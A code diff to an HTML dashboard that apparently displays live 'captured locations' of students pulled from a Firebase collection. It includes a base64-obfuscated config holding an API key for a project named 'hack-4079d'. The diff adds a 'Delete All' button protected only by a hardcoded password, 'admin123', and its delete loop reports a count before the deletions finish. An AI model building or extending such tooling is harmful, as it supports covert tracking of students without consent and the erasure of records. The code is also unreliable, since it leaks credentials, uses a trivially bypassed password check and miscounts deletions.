@@ -23,7 +23,10 @@
         <div class="container">
             <h2>
                 <span>📍 Captured Locations (Live)</span>
-                <span id="count" style="font-size: 16px; color: #666;">Total: 0</span>
+                <div>
+                    <span id="count" style="font-size: 16px; color: #666; margin-right: 15px;">Total: 0</span>
+                    <button id="delete-all-btn" class="btn btn-danger" style="font-size: 14px;">Delete All</button>
+                </div>
             </h2>
             <table>
                 <thead>
@@ -52,7 +55,7 @@
         document.getElementById('app').style.display = 'block';
 
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, query, orderBy, onSnapshot, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, collection, query, orderBy, onSnapshot, deleteDoc, doc, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         // Obfuscated config
         const _fc = "eyJhcGlLZXkiOiJBSXphU3lESFhDal9Uay1oc1pDbmVuZldrQlZTUlBWVW1vQVlRbWsiLCJhdXRoRG9tYWluIjoiaGFjay00MDc5ZC5maXJlYmFzZWFwcC5jb20iLCJwcm9qZWN0SWQiOiJoYWNrLTQwNzlkIiwic3RvcmFnZUJ1Y2tldCI6ImhhY2stNDA3OWQuZmlyZWJhc2VzdG9yYWdlLmFwcCIsIm1lc3NhZ2luZ1NlbmRlcklkIjoiNTg1MzU5NDgyNDk0IiwiYXBwSWQiOiIxOjU4NTM1OTQ4MjQ5NDp3ZWI6ZjM4OWRkNWVlNmY2MWZmMWYzMDIyZiIsIm1lYXN1cmVtZW50SWQiOiJHLUxIR0tYTEZWWlcifQ==";
@@ -120,6 +123,28 @@
         }, (error) => {
             console.error("Firebase Error:", error);
             tbody.innerHTML = `<tr><td colspan="5" style="color:red;">Error loading data: ${error.message}</td></tr>`;
+        });
+
+        // Delete All Logic
+        document.getElementById('delete-all-btn').addEventListener('click', async () => {
+            if(confirm("Are you SURE you want to delete ALL captured locations? This cannot be undone.")) {
+                const pass = prompt("Enter Admin Password to confirm Delete All:");
+                if (pass === "admin123") {
+                    try {
+                        const snapshot = await getDocs(collection(db, "student_locations"));
+                        let count = 0;
+                        snapshot.forEach(async (docSnap) => {
+                            await deleteDoc(doc(db, "student_locations", docSnap.id));
+                            count++;
+                        });
+                        alert(`Deleted ${count} records successfully.`);
+                    } catch (err) {
+                        alert("Error deleting all: " + err.message);
+                    }
+                } else {
+                    alert("Wrong password!");
+                }
+            }
         });
     </script>
 </body>
